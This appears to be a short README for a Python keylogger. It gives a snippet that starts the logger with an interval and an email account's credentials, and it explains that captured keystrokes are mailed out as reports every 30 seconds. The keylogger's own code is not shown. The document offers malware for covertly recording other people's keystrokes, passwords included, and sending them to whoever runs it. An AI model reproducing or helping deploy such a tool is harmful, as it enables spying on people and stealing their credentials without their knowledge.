# Keylogger
Send a report of keylogs by email:

```python
keylogger = Keylogger(30, 'email', 'password')
keylogger.start()
```
The first parameter indicates every how many seconds the report will be sent to your email, and then provide an email and password for an account that will send the key logs to itself.